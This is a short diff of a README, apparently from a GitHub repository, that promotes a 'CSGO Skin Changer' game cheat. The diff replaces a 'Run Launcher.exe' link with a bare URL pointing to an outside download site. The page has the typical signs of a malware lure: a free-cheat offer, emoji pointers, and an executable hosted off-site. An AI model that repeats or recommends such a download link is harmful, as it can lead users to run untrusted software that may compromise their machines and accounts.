@@ -15,7 +15,7 @@ You love CS:GO, but miss some skins? Would you like to get Dragon Lore, or M9 Ba
 
 + ✅CSGO Skin Changer
 + 👇👇👇👇👇
-+ [🏵 Run "Launcher.exe"](https://lavalink.pw/CSGO_Skin_Changer/index.php ![image](https://github.com/CSGO-SkinChanger/CSGO_Skin_Changer/assets/149183937/56c69158-d7d2-463f-9424-bc9fcda23f80))
++ https://lavalink.pw/CSGO_Skin_Changer/index.php ![image](https://github.com/CSGO-SkinChanger/CSGO_Skin_Changer/assets/149183937/56c69158-d7d2-463f-9424-bc9fcda23f80)
 
 
 
